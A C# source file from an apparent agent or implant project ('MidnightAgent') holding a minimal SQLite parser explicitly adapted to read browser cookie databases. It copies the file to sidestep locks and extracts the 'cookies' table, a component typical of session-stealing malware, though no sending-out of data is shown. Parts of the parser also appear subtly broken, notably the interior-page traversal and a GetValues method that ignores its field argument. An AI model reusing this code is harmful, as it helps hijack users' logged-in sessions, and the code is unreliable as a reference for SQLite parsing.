using System;
using System.IO;
using System.Text;

namespace MidnightAgent.Utils
{
    // Minimal SQLite parser adapted for cookie reading
    public class SqliteHandler
    {
        private readonly byte[] _dbBytes;
        private readonly ulong _encoding;
        private readonly ushort _pageSize;

        public SqliteHandler(string baseName)
        {
            if (File.Exists(baseName))
            {
                File.Copy(baseName, baseName + "_bak", true);
                _dbBytes = File.ReadAllBytes(baseName + "_bak");
                try { File.Delete(baseName + "_bak"); } catch { }
                _pageSize = (ushort)ConvertToULong(16, 2);
                _encoding = ConvertToULong(56, 4);
            }
        }

        public int GetRowCount()
        {
            if (ReadTable("cookies")) return _tableEntries.Length;
            return 0;
        }

        public string[] GetValues(int rowNum, int field)
        {
            try
            {
                if (rowNum >= _tableEntries.Length) return null;
                return _tableEntries[rowNum].Content; // Return all fields for debug
            }
            catch { return null; }
        }

        public string GetValue(int rowNum, int field)
        {
            try
            {
                if (_tableEntries == null || rowNum >= _tableEntries.Length) return null;
                return field < _tableEntries[rowNum].Content.Length ? _tableEntries[rowNum].Content[field] : null;
            }
            catch { return null; }
        }

        public string GetDebugInfo()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Tables found in Master:");
            
            // Reload master to check
            var oldEntries = _tableEntries;
            _tableEntries = new Record[0];
            ReadTableEntries(100);
            
            foreach(var entry in _tableEntries)
            {
                if(entry.Content.Length > 2)
                    sb.AppendLine($"- {entry.Content[1]} / {entry.Content[2]} (Root: {entry.Content[3]})");
            }
            
            // Restore (if needed) or just leave it
             _tableEntries = oldEntries;
             
             sb.AppendLine("\nInternal Log:");
             sb.Append(_internalLog.ToString());

             return sb.ToString();
        }

        private struct Record
        {
            public long Id;
            public string[] Content;
        }

        private Record[] _tableEntries;


        public bool ReadTable(string tableName)
        {
            try
            {
                // 1. Read Master Table (Page 1, offset 100)
                _tableEntries = new Record[0];
                ReadTableEntries(100); 

                // 2. Find specific table
                long rootPage = -1;
                foreach(var entry in _tableEntries)
                {
                    // Check tbl_name (usually col 1 or 2)
                    for(int i=0; i<entry.Content.Length; i++) 
                    {
                        if (entry.Content[i] != null && entry.Content[i].ToLower() == tableName.ToLower())
                        {
                            // Found table, look for rootpage integer in subsequent columns
                            // usually col 3 but verify
                             if (long.TryParse(entry.Content[3], out rootPage)) 
                             {
                                 _internalLog.AppendLine($"Found table '{tableName}' at RootPage {rootPage}");
                                 break;
                             }
                        }
                    }
                    if (rootPage != -1) break;
                }

                if (rootPage > 0)
                {
                    _tableEntries = new Record[0]; // Clear master records
                    ulong offset = (ulong)(rootPage - 1) * _pageSize;
                    _internalLog.AppendLine($"Jumping to Offset {offset} (PageSize {_pageSize})");
                    
                    int rows = ReadTableEntries(offset);
                    _internalLog.AppendLine($"Read {rows} rows from target table");
                    return true;
                }
                
                _internalLog.AppendLine($"Table '{tableName}' not found in master.");
                return false;
            }
            catch (Exception ex)
            {
                _internalLog.AppendLine($"ReadTable Error: {ex}");
                return false;
            }
        }

        private StringBuilder _internalLog = new StringBuilder();

        private int ReadTableEntries(ulong offset)
        {
            try
            {
                if (offset >= (ulong)_dbBytes.Length) 
                {
                    _internalLog.AppendLine($"OOB Read: {offset} vs {_dbBytes.Length}");
                    return 0;
                }

                byte pageType = _dbBytes[offset];
                ushort cellCount = (ushort)ConvertToULong((int)offset + 3, 2);
                
                string hexDump = BitConverter.ToString(_dbBytes, (int)offset, 16);
                _internalLog.AppendLine($"Page @{offset}: Type {pageType} (0x{pageType:X}), Cells {cellCount}, Header: {hexDump}");

                if (pageType == 13 || pageType == 0x0D) // Leaf table
                {
                    if (_tableEntries == null) _tableEntries = new Record[0];
                    
                    var newEntries = new Record[_tableEntries.Length + cellCount];
                    Array.Copy(_tableEntries, newEntries, _tableEntries.Length);
                    
                    for (int i = 0; i < cellCount; i++)
                    {
                        ulong cellOffset = ConvertToULong((int)offset + 8 + (i * 2), 2);
                        if (offset != 100) cellOffset += offset;
                        
                        try 
                        {
                            int payloadSize = (int)GetVarInt((int)cellOffset, out int charRead);
                            long rowId = GetVarInt((int)cellOffset + charRead, out int charRead2);
                            int headerOffset = (int)cellOffset + charRead + charRead2;
                            int headerSize = (int)GetVarInt(headerOffset, out int charRead3); // Header size
                            
                            ulong nextFieldOffset = (ulong)(headerOffset + headerSize);
                            int startPtr = headerOffset + charRead3;
                            int endPtr = headerOffset + headerSize;
                            
                            var content = new string[20]; 
                            int currentField = 0;
                            int headerPtr = startPtr;

                            while (headerPtr < endPtr)
                            {
                                long type = GetVarInt(headerPtr, out int typeLen);
                                headerPtr += typeLen;
                                
                                if (type > 9)
                                {
                                    long len = (type - 12) / 2;
                                    if ((type & 1) != 0) len = (type - 13) / 2;
                                    
                                    byte[] buffer = new byte[len];
                                    Array.Copy(_dbBytes, (int)nextFieldOffset, buffer, 0, (int)len);
                                    
                                    if ((type & 1) != 0) // String
                                        content[currentField] = Encoding.UTF8.GetString(buffer);
                                    else // Blob
                                        content[currentField] = Convert.ToBase64String(buffer);
                                        
                                    nextFieldOffset += (ulong)len;
                                }
                                else
                                {
                                    long len = 0;
                                    switch (type)
                                    {
                                        case 1: len = 1; break;
                                        case 2: len = 2; break;
                                        case 3: len = 3; break;
                                        case 4: len = 4; break;
                                        case 5: len = 6; break;
                                        case 6: len = 8; break;
                                        case 7: len = 8; break;
                                    }
                                    
                                    if (len > 0)
                                    {
                                        content[currentField] = ConvertToULong((int)nextFieldOffset, (int)len).ToString();
                                        nextFieldOffset += (ulong)len;
                                    }
                                    else if (type == 8) content[currentField] = "0";
                                    else if (type == 9) content[currentField] = "1";
                                }
                                currentField++;
                                if (currentField >= 20) break;
                            }
                            
                            newEntries[_tableEntries.Length + i] = new Record { Id = rowId, Content = content };
                        }
                        catch (Exception ex)
                        {
                            _internalLog.AppendLine($"Cell error: {ex.Message}");
                        }
                    }
                    _tableEntries = newEntries;
                    return _tableEntries.Length;
                }
                else if (pageType == 5) // Interior table
                {
                    for (int i = 0; i < cellCount; i++)
                    {
                        ulong childPage = ConvertToULong((int)offset + 12 + (i * 2), 4);
                        if (childPage > 0)
                            ReadTableEntries((childPage - 1) * _pageSize);
                    }
                    ulong finalPage = ConvertToULong((int)offset + 8, 4);
                    if (finalPage > 0)
                        ReadTableEntries((finalPage - 1) * _pageSize);
                }
                
                return 0;
            }
            catch (Exception ex)
            { 
                _internalLog.AppendLine($"Page read error: {ex.Message}");
                return 0; 
            }
        }

        private long GetVarInt(int offset, out int charRead)
        {
            long val = 0;
            charRead = 0;
            for (int i = 0; i < 8; i++)
            {
                if (offset + i >= _dbBytes.Length) break;
                byte b = _dbBytes[offset + i];
                charRead++;
                val = (val << 7) | (long)(b & 0x7F);
                if ((b & 0x80) == 0) return val;
            }
            return val;
        }

        private ulong ConvertToULong(int startIndex, int size)
        {
            if (size > 8 || size == 0) return 0;
            ulong val = 0;
            for (int i = 0; i < size; i++)
                val = (val << 8) | _dbBytes[startIndex + i];
            return val;
        }
    }
}
